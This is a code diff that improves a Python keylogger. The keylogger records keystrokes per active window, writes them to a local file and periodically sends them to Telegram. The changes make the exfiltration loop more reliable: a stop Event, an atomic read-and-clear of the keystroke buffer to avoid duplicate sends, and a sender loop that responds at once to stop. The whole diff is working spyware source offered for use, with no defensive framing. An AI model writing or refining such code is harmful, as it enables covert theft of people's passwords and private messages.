@@ -18,6 +18,7 @@ import threading
 import ctypes
 from datetime import datetime
 from collections import defaultdict
+from threading import Event
 
 logger = logging.getLogger(__name__)
 
@@ -130,6 +131,7 @@ class Keylogger:
         self._listener = None
         self._sender_thread = None
         self._log_file = os.path.join(base_dir, "keylog.txt")
+        self._stop_event = Event()
 
     # ------------------------------------------------------------------
     # Public API
@@ -144,6 +146,7 @@ class Keylogger:
             return True
 
         self._running = True
+        self._stop_event.clear()
         self._listener = keyboard.Listener(on_press=self._on_press)
         self._listener.daemon = True
         self._listener.start()
@@ -158,6 +161,7 @@ class Keylogger:
     def stop(self):
         """Stop keylogger."""
         self._running = False
+        self._stop_event.set()  # wake up _auto_sender_loop immediately
         if self._listener:
             try:
                 self._listener.stop()
@@ -179,10 +183,24 @@ class Keylogger:
                 if text.strip():
                     lines.append(f"🪟 [{window[:60]}]\n{text}\n")
             return "\n".join(lines)
-
+    def _get_and_clear_report(self) -> str:
+        """Atomically read the current buffer AND clear it (prevents duplicate sends)."""
+        with self._lock:
+            if not self._buffer:
+                return ""
+            lines = []
+            for window, chars in self._buffer.items():
+                text = "".join(chars)
+                if text.strip():
+                    lines.append(f"🪩 [{window[:60]}]\n{text}\n")
+            self._buffer.clear()  # clear inside the same lock — atomic
+            return "\n".join(lines)
     def flush_and_send(self, label: str = "auto") -> bool:
-        """Send current buffer to Telegram and clear it."""
-        report = self.get_report()
+        """Send current buffer to Telegram and clear it.
+        Uses atomic get+clear to prevent duplicate sends when called concurrently
+        (e.g. scheduled flush + buffer_full flush racing).
+        """
+        report = self._get_and_clear_report()  # atomic: get AND clear in one lock
         if not report:
             return False
 
@@ -215,9 +233,7 @@ class Keylogger:
             logger.error(f"Keylog send failed: {e}")
             return False
 
-        # Clear buffer
-        with self._lock:
-            self._buffer.clear()
+        # Buffer already cleared atomically in _get_and_clear_report()
         return True
 
     def get_log_file_path(self) -> str:
@@ -260,9 +276,11 @@ class Keylogger:
     def _auto_sender_loop(self):
         """Periodically send accumulated keystrokes."""
         while self._running:
-            time.sleep(self.send_interval)
+            # Use Event.wait instead of sleep — responds to stop() immediately
+            self._stop_event.wait(self.send_interval)
             if not self._running:
                 break
+            self._stop_event.clear()
             try:
                 self.flush_and_send("scheduled")
             except Exception as e:
